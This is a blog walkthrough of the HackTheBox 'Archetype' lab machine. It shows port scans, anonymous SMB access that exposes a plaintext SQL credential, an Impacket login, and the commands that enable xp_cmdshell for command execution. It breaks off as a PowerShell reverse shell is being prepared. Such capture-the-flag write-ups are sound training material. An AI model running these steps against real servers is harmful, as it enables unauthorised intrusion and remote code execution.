<!DOCTYPE html>
<html ‚ö°>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">

    <title>Archetype Walkthrough</title>

    <meta name="description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it‚Äôs a series of 9 machines rated easy that should be rooted in a sequence." />
    <link rel="icon" href="../../favicon.ico" type="image/x-icon" />
    <link rel="canonical" href="../index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    
    <meta property="og:site_name" content="h4rithd.com" />
    <meta property="og:type" content="article" />
    <meta property="og:title" content="Archetype Walkthrough" />
    <meta property="og:description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it‚Äôs a series of 9 machines rated easy that should be rooted in a sequence." />
    <meta property="og:url" content="http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/" />
    <meta property="og:image" content="http://192.168.8.3:2368/content/images/2021/05/1-1.jpg" />
    <meta property="article:published_time" content="2021-04-14T18:47:00.000Z" />
    <meta property="article:modified_time" content="2021-05-27T10:16:27.000Z" />
    <meta property="article:tag" content="StartingPoint" />
    <meta property="article:tag" content="HackTheBox" />
    <meta property="article:tag" content="Archetype Walkthrough" />
    <meta property="article:tag" content="h4rithd" />
    <meta property="article:tag" content="HarithDilshan" />
    
    <meta property="article:publisher" content="https://www.facebook.com/ShapManasick" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Archetype Walkthrough" />
    <meta name="twitter:description" content="Here I will begin with the path of &quot;Starting Point&quot;. Basically it‚Äôs a series of 9 machines rated easy that should be rooted in a sequence." />
    <meta name="twitter:url" content="http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/" />
    <meta name="twitter:image" content="http://192.168.8.3:2368/content/images/2021/05/1-1.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Harith Dilshan" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="StartingPoint, HackTheBox, Archetype Walkthrough, h4rithd, HarithDilshan" />
    <meta name="twitter:site" content="@h4rithd" />
    <meta property="og:image:width" content="1920" />
    <meta property="og:image:height" content="1182" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "h4rithd.com",
        "url": "http://192.168.8.3:2368/",
        "logo": {
            "@type": "ImageObject",
            "url": "http://192.168.8.3:2368/content/images/2021/05/my.png",
            "width": 60,
            "height": 60
        }
    },
    "author": {
        "@type": "Person",
        "name": "Harith Dilshan",
        "image": {
            "@type": "ImageObject",
            "url": "http://192.168.8.3:2368/content/images/2021/05/176773693_2267679413366261_3955357600281674809_n-2.jpg",
            "width": 2000,
            "height": 2000
        },
        "url": "http://192.168.8.3:2368/author/harith/",
        "sameAs": []
    },
    "headline": "Archetype Walkthrough",
    "url": "http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/",
    "datePublished": "2021-04-14T18:47:00.000Z",
    "dateModified": "2021-05-27T10:16:27.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "http://192.168.8.3:2368/content/images/2021/05/1-1.jpg",
        "width": 1920,
        "height": 1182
    },
    "keywords": "StartingPoint, HackTheBox, Archetype Walkthrough, h4rithd, HarithDilshan",
    "description": "Here I will begin with the path of &quot;Starting Point&quot;. Basically it‚Äôs a series of\n9 machines rated as &quot;very easy&quot; and should be rooted in a sequence.\n\n\n--------------------------------------------------------------------------------\n\nThey will provide official walkthroughs for each of 9 machines. As I think it\nwill be very helpful for noob to understand the platform, techniques and more\nabout HTB. And when it comes to noob, no one is here to find zero-day \nvulnerabilities. So from my perspective, ",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://192.168.8.3:2368/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.6" />
    <link rel="alternate" type="application/rss+xml" title="h4rithd.com" href="../../rss/index.html" />

    <style amp-custom>
    *,
    *::before,
    *::after {
        box-sizing: border-box;
    }

    html {
        overflow-x: hidden;
        overflow-y: scroll;
        font-size: 62.5%;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
    }

    body {
        min-height: 100vh;
        margin: 0;
        padding: 0;
        color: #3a4145;
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        font-size: 1.7rem;
        line-height: 1.55em;
        font-weight: 400;
        font-style: normal;
        background: #fff;
        scroll-behavior: smooth;
        overflow-x: hidden;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }

    p,
    ul,
    ol,
    li,
    dl,
    dd,
    hr,
    pre,
    form,
    table,
    video,
    figure,
    figcaption,
    blockquote {
        margin: 0;
        padding: 0;
    }

    ul[class],
    ol[class] {
        padding: 0;
        list-style: none;
    }

    img {
        display: block;
        max-width: 100%;
    }

    input,
    button,
    select,
    textarea {
        font: inherit;
        -webkit-appearance: none;
    }

    fieldset {
        margin: 0;
        padding: 0;
        border: 0;
    }

    label {
        display: block;
        font-size: 0.9em;
        font-weight: 700;
    }

    hr {
        position: relative;
        display: block;
        width: 100%;
        height: 1px;
        border: 0;
        border-top: 1px solid currentcolor;
        opacity: 0.1;
    }

    ::selection {
        text-shadow: none;
        background: #cbeafb;
    }

    mark {
        background-color: #fdffb6;
    }

    small {
        font-size: 80%;
    }

    sub,
    sup {
        position: relative;
        font-size: 75%;
        line-height: 0;
        vertical-align: baseline;
    }
    sup {
        top: -0.5em;
    }
    sub {
        bottom: -0.25em;
    }

    ul li + li {
        margin-top: 0.6em;
    }

    a {
        color: var(--ghost-accent-color, #1292EE);
        text-decoration-skip-ink: auto;
    }

    h1,
    h2,
    h3,
    h4,
    h5,
    h6 {
        margin: 0;
        font-weight: 700;
        color: #121212;
        line-height: 1.4em;
    }

    h1 {
        font-size: 3.4rem;
        line-height: 1.1em;
    }

    h2 {
        font-size: 2.4rem;
        line-height: 1.2em;
    }

    h3 {
        font-size: 1.8rem;
    }

    h4 {
        font-size: 1.7rem;
    }

    h5 {
        font-size: 1.6rem;
    }

    h6 {
        font-size: 1.6rem;
    }

    amp-img {
        height: 100%;
        width: 100%;
        max-width: 100%;
        max-height: 100%;
    }

    amp-img img {
        object-fit: cover;
    }

    .page-header {
        padding: 50px 5vmin 30px;
        text-align: center;
        font-size: 2rem;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .page-header a {
        color: #121212;
        font-weight: 700;
        text-decoration: none;
        font-size: 1.6rem;
        letter-spacing: -0.1px;
    }

    .post {
        max-width: 680px;
        margin: 0 auto;
    }

    .post-header {
        margin: 0 5vmin 5vmin;
        text-align: center;
    }

    .post-meta {
        margin: 1rem 0 0 0;
        text-transform: uppercase;
        color: #738a94;
        font-weight: 500;
        font-size: 1.3rem;
    }

    .post-image {
        margin: 0 0 5vmin;
    }

    .post-image img {
        display: block;
        width: 100%;
        height: auto;
    }

    .post-content {
        padding: 0 5vmin;
    }

    .post-content > * + * {
        margin-top: 1.5em;
    }

    .post-content [id]:not(:first-child) {
        margin: 2em 0 0;
    }

    .post-content > [id] + * {
        margin-top: 1rem;
    }

    .post-content [id] + .kg-card,
    .post-content blockquote + .kg-card {
        margin-top: 40px;
    }

    .post-content > ul,
    .post-content > ol,
    .post-content > dl {
        padding-left: 1.9em;
    }

    .post-content hr {
        margin-top: 40px;
    }

    .post .post-content hr + * {
        margin-top: 40px;
    }

    .post-content amp-img {
        background-color: #f8f8f8;
    }

    .post-content blockquote {
        position: relative;
        font-style: italic;
    }

    .post-content blockquote::before {
        content: "";
        position: absolute;
        left: -1.5em;
        top: 0;
        bottom: 0;
        width: 0.3rem;
        background: var(--ghost-accent-color, #1292EE);
    }

    .post-content :not(.kg-card):not([id]) + .kg-card {
        margin-top: 40px;
    }

    .post-content .kg-card + :not(.kg-card) {
        margin-top: 40px;
    }

    .kg-card figcaption {
        padding: 1.5rem 1.5rem 0;
        text-align: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.4em;
        opacity: 0.6;
    }

    .kg-card figcaption strong {
        color: rgba(0,0,0,0.8);
    }

    .post-content :not(pre) code {
        vertical-align: middle;
        padding: 0.15em 0.4em 0.15em;
        border: #e1eaef 1px solid;
        font-weight: 400;
        font-size: 0.9em;
        line-height: 1em;
        color: #15171a;
        background: #f0f6f9;
        border-radius: 0.25em;
    }

    .post-content > pre {
        overflow: scroll;
        padding: 16px 20px;
        color: #fff;
        background: #1F2428;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0,0,0,.1), 0 0 1px rgba(0,0,0,.4);
    }

    .kg-embed-card {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
    }

    .kg-image-card img {
        margin: auto;
    }

    .kg-gallery-card + .kg-gallery-card {
        margin-top: 0.75em;
    }

    .kg-gallery-container {
        position: relative;
    }

    .kg-gallery-row {
        display: flex;
        flex-direction: row;
        justify-content: center;
    }

    .kg-gallery-image {
        width: 100%;
        height: 100%;
    }

    .kg-gallery-row:not(:first-of-type) {
        margin: 0.75em 0 0 0;
    }

    .kg-gallery-image:not(:first-of-type) {
        margin: 0 0 0 0.75em;
    }

    .kg-bookmark-card,
    .kg-bookmark-publisher {
        position: relative;
    }

    .kg-bookmark-container,
    .kg-bookmark-container:hover {
        display: flex;
        flex-wrap: wrap;
        flex-direction: row-reverse;
        color: currentColor;
        background: rgba(255,255,255,0.6);
        font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;
        text-decoration: none;
        border-radius: 5px;
        box-shadow: 0 2px 6px -2px rgba(0, 0, 0, 0.1), 0 0 1px rgba(0, 0, 0, 0.4);
        overflow: hidden;
    }

    .kg-bookmark-content {
        flex-basis: 0;
        flex-grow: 999;
        padding: 20px;
        order: 1;
    }

    .kg-bookmark-title {
        font-weight: 600;
        font-size: 1.5rem;
        line-height: 1.3em;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        max-height: 45px;
        margin: 0.5em 0 0 0;
        font-size: 1.4rem;
        line-height: 1.55em;
        overflow: hidden;
        opacity: 0.8;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
    }

    .kg-bookmark-metadata {
        margin-top: 20px;
    }

    .kg-bookmark-metadata {
        display: flex;
        align-items: center;
        font-weight: 500;
        font-size: 1.3rem;
        line-height: 1.3em;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }

    .kg-bookmark-description {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
    }

    .kg-bookmark-metadata amp-img {
        width: 18px;
        height: 18px;
        max-width: 18px;
        max-height: 18px;
        margin-right: 10px;
    }

    .kg-bookmark-thumbnail {
        display: flex;
        flex-basis: 20rem;
        flex-grow: 1;
        justify-content: flex-end;
    }

    .kg-bookmark-thumbnail amp-img {
        max-height: 200px;
    }

    .kg-bookmark-author {
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden;
    }

    .kg-bookmark-publisher::before {
        content: "‚Ä¢";
        margin: 0 .5em;
    }

    .kg-width-full.kg-card-hascaption {
        display: grid;
        grid-template-columns: inherit;
    }

    .post-content table {
        border-collapse: collapse;
        width: 100%;
    }

    .post-content th {
        padding: 0.5em 0.8em;
        text-align: left;
        font-size: .75em;
        text-transform: uppercase;
    }

    .post-content td {
        padding: 0.4em 0.7em;
    }

    .post-content tbody tr:nth-child(2n + 1) {
        background-color: rgba(0,0,0,0.1);
        padding: 1px;
    }

    .post-content tbody tr:nth-child(2n + 2) td:last-child {
        box-shadow:
            inset 1px 0 rgba(0,0,0,0.1),
            inset -1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:nth-child(2n + 2) td {
        box-shadow: inset 1px 0 rgba(0,0,0,0.1);
    }

    .post-content tbody tr:last-child {
        border-bottom: 1px solid rgba(0,0,0,.1);
    }

    .page-footer {
        padding: 60px 5vmin;
        margin: 60px auto 0;
        text-align: center;
        background-color: #f8f8f8;
    }

    .page-footer h3 {
        margin: 0.5rem 0 0 0;
    }

    .page-footer p {
        max-width: 500px;
        margin: 1rem auto 1.5rem;
        font-size: 1.7rem;
        line-height: 1.5em;
        color: rgba(0,0,0,0.6)
    }

    .powered {
        display: inline-flex;
        align-items: center;
        margin: 30px 0 0;
        padding: 6px 9px 6px 6px;
        border: rgba(0,0,0,0.1) 1px solid;
        font-size: 12px;
        line-height: 12px;
        letter-spacing: -0.2px;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        font-weight: 500;
        color: #222;
        text-decoration: none;
        background: #fff;
        border-radius: 6px;
    }

    .powered svg {
        height: 16px;
        width: 16px;
        margin: 0 6px 0 0;
    }

    @media (max-width: 600px) {
        body {
            font-size: 1.6rem;
        }
        h1 {
            font-size: 3rem;
        }

        h2 {
            font-size: 2.2rem;
        }
    }

    @media (max-width: 400px) {
        h1 {
            font-size: 2.6rem;
            line-height: 1.15em;
        }
        h2 {
            font-size: 2rem;
            line-height: 1.2em;
        }
        h3 {
            font-size: 1.7rem;
        }
    }

    :root {--ghost-accent-color: #006ac7;}
    </style>

    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
    <script async src="https://cdn.ampproject.org/v0.js"></script>

    

</head>

<body class="amp-template">
    <header class="page-header">
        <a href="../../index.html">
                <amp-img class="site-icon" src="http://192.168.8.3:2368/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
        </a>
    </header>

    <main class="content" role="main">
        <article class="post">

            <header class="post-header">
                <h1 class="post-title">Archetype Walkthrough</h1>
                <section class="post-meta">
                    Harith Dilshan -
                    <time class="post-date" datetime="2021-04-15">15 Apr 2021</time>
                </section>
            </header>
            <figure class="post-image">
                <amp-img src="http://192.168.8.3:2368/content/images/2021/05/1-1.jpg" width="600" height="340" layout="responsive"></amp-img>
            </figure>
            <section class="post-content">

                <p>Here I will begin with the path of "<strong>Starting Point</strong>". Basically it‚Äôs a series of 9 machines rated as "<strong>very easy" </strong>and should be rooted in a sequence.</p><hr></hr><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-2.png" class="kg-image" alt width="999" height="759" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-2.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-2.png 999w" layout="responsive"></amp-img></figure><p>They will provide official walkthroughs for each of 9 machines. As I think it will be very helpful for noob to understand the platform, techniques and more about HTB. And when it comes to noob, no one is here to find <code>zero-day</code> vulnerabilities. So from my perspective, it's fine to read each and every walkthroughs provided by HTB and others to understand by yourself. <em>"Walkthroughs are the teachers".</em></p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-3.png" class="kg-image" alt width="1202" height="328" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-3.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-3.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-3.png 1202w" layout="responsive"></amp-img></figure><p>Enough talks ü•±, let's start to hack. üê±‚Äçüíª</p><blockquote>Disclaimers: No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! üê±‚Äçüë§</blockquote><hr></hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine ‚Ä¶</h2><p>To start machine, Just click "<strong>Join Machine</strong>".</p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-4.png" class="kg-image" alt width="1633" height="751" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-4.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-4.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-4.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-4.png 1633w" layout="responsive"></amp-img></figure><p>Then you can see the <strong>IP </strong>address for that machine. usually it is<strong> 10.10.10.27 ü§†</strong></p><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-83.png" class="kg-image" alt width="424" height="442" layout="responsive"></amp-img></figure><p>Before going to enumeration steps we can simply ping to the IP address and check our VPN connection and whether machine is alive. Sometimes machines might "Disable" ping requests from passing through the firewall. But in most case ping will be a success!</p><pre><code class="language-sql">root in ~/Documents/HackThebox/Archetype
‚ö°‚ùØ ping 10.10.10.27 -c 2
PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=252 ms
64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=251 ms

--- 10.10.10.27 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 250.934/251.550/252.167/0.616 ms
--------------------------------------------------------------------</code></pre><p>As a ping result, It's <code>TTL=127</code>. There is one route between machine and us (VPN) so it's definitely it will be <code>Windows</code> machine.</p><hr></hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First ‚Ä¶</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27</code></pre><pre><code class="language-bash">-n	: Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable netwok</code></pre><p>Here is the output üëá</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2 
‚ö°‚ùØ nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:15 +0530
Initiating Ping Scan at 19:15
Scanning 10.10.10.27 [4 ports]
Completed Ping Scan at 19:15, 0.27s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:15
Scanning 10.10.10.27 [65535 ports]
Completed SYN Stealth Scan at 19:17, 172.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.27
Host is up, received echo-reply ttl 127 (0.67s latency).
Scanned at 2021-04-15 19:15:06 +0530 for 173s
Not shown: 65523 closed ports
Reason: 65523 resets
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127 * (Interesting)
139/tcp   open  netbios-ssn  syn-ack ttl 127 * (Interesting)
445/tcp   open  microsoft-ds syn-ack ttl 127 * (Interesting)
1433/tcp  open  ms-sql-s     syn-ack ttl 127 * (Interesting)
5985/tcp  open  wsman        syn-ack ttl 127 * (Interesting)
47001/tcp open  winrm        syn-ack ttl 127 * (Interesting)
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
           Raw packets sent: 102404 (4.506MB) | Rcvd: 93270 (3.731MB)
--------------------------------------------------------------------</code></pre><p>Here we can see some ¬†<strong>* (Interesting)</strong> ports. others can be avoid.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all open ports so that we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27</code></pre><pre><code class="language-bash">-sV	: Service fingerprinting
-sC	: Launch default NSE nmap scripts</code></pre><p>Here is the output üëá</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:38 +0530
Nmap scan report for 10.10.10.27
Host is up (0.52s latency).

PORT     STATE  SERVICE        VERSION
135/tcp  open   msrpc          Microsoft Windows RPC
139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
455/tcp  closed creativepartnr
1433/tcp open   ms-sql-s       Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-04-15T14:30:06
|_Not valid after:  2051-04-15T14:30:06
|_ssl-date: 2021-04-15T14:30:34+00:00; +21m39s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21m39s, deviation: 0s, median: 21m38s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds</code></pre><p>Now we know the OS is Windows (Microsoft SQL Server 2017 RTM) and it has SMB (1433) port open. And lets enumerate further. Remember enumerating is the<strong> key!</strong> üîë</p><h3 id="013-list-all-available-shares">01.3 List all available shares</h3><p>So here it has <code>smb</code> (1433) port open. I used <code>smbclient</code> to list out all the available shares as <code>anonymous</code> user.</p><pre><code class="language-bash">sudo smbclient -N -L 10.10.10.27</code></pre><pre><code class="language-bash">-N	: Don't ask for a password
-L	: Get a list of shares available on a host</code></pre><p>Here is output üëá</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ sudo smbclient -N -L 10.10.10.27

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available</code></pre><p>Here we got something very interesting right? There is only single share ‚Äò<strong>backups</strong>‚Äô accessible with no passwords. so let's try to access it and see what's inside.üòéüòã</p><pre><code class="language-bash">smbclient -N \\\\10.10.10.27\\backups\\</code></pre><p>So now we are done with <code>SMB</code> shell and there is a file called ‚Äòprod.dtsConfig'. so let's download it.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ smbclient -N \\\\10.10.10.27\\backups\\
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                10328063 blocks of size 4096. 8203982 blocks available
smb: \&gt; get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \&gt;</code></pre><pre><code class="language-bash">smb: \&gt; dir	: List all directories
smb: \&gt; get	&lt;file-name&gt; : Download file</code></pre><p>Now we can open <code>prod.dtsConfig</code> file and yeah that ‚Äòprod.dtsConfig‚Äô file contains a <code>SQL connection string</code>, containing credentials for the local Windows user <strong>ARCHETYPE\sql_svc</strong> ü•Ç.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2  took 5m55s
‚ö°‚ùØ more prod.dtsConfig
&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt;</code></pre><hr></hr><h2 id="02-lets-get-foothold-%E2%80%A6">02. Lets get Foothold ‚Ä¶</h2><p>Now we have credentials, ¬†Let's try connecting to the SQL Server using <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py" rel="noopener noreferrer">Impacket's </a>mssqlclient.py</p><blockquote>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.source : <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a></blockquote><h3 id="021-download-and-use-mssqlclientpy">02.1 Download and use mssqlclient.py</h3><p>First we need to simply <code>wget</code> and download the <code>mssqlclient.py</code> script.</p><pre><code class="language-bash"> wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
</code></pre><p>And then run the script and check whether we are working as a <code>sysadmin</code> (privileged user) or not.</p><pre><code class="language-bash">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth</code></pre><p>Now we can use the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><strong>IS_SRVROLEMEMBER </strong></a>function to check whether the current SQL user has <code>sysadmin</code> (highest level) privileges on the SQL Server.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL&gt; SELECT IS_SRVROLEMEMBER ('sysadmin')


-----------

          1

SQL&gt;</code></pre><p>According to the return value (1 = login is a member of role.) yes we have highest privileges.üòÅ This will allow us to enable <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><code>xp_cmdshell</code></a> and gain RCE on the host.</p><p>Check below awesome blog posts to understand that trick.</p><ul><li>Pentesting MSSQL - Microsoft SQL Server <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li><li>MySQL Information Gathering <a href="https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql" rel="noopener noreferrer">https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql</a></li></ul><h3 id="022-usage-of-xpcmdshell">02.2 Usage of ¬†xp_cmdshell</h3><p>To get <code>xp_cmdshell</code>, type below commands.</p><pre><code class="language-sql">EXEC sp_configure 'Show Advanced Options', 1; 
reconfigure; 
sp_configure; 
EXEC sp_configure 'xp_cmdshell', 1 
reconfigure; 
xp_cmdshell "whoami"</code></pre><pre><code class="language-sql">SQL&gt; xp_cmdshell "whoami"
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL</code></pre><p>However, Now we can run system commands using <code>xp_cmdshell</code>. why can't we get proper shell. ü§†</p><p>Hmmmmah !! what a nice smell for <code>powershell reverse-shell</code> huh! üòç</p><p>You can get some idea about reverse shells from below links,</p><ul><li>Reverse Shell Generator <a href="https://www.revshells.com/" rel="noopener noreferrer">https://www.revshells.com</a>‚Äã</li><li>Nishang framework <a href="https://github.com/samratashok/nishang" rel="noopener noreferrer">https://github.com/samratashok/nishang</a>‚Äã</li><li>TCP port communications with PowerShell <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/" rel="noopener noreferrer">https://livebook.manning.com/book/powershell-deep-dives/chapter-4</a>‚Äã</li></ul><p>But personally, I like to use Nishang's <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1" rel="noopener noreferrer">Invoke-PowerShellTcpOneLine.ps1</a> to create my rev-shell.</p><p>After deleting all comments and unwanted things, powershell script will be like 